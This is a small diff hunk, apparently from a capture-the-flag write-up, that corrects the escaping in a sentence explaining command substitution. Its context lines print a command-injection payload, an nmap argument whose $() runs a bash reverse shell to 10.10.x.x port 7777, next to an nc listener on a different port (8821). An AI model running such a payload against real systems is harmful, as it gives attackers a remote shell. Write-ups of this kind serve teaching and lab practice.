@@ -63,7 +63,7 @@ comment commands after payload
 
 The script will run
 `nmap $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")`
-$() works as  command substitution, the output of $() will sent to nmap. but $() will be executed.
+ \$\() works as  command substitution, the output of \$() will sent to nmap. but $() will be executed.
 
 `└─$ nc -nvlp 8821`
 ```
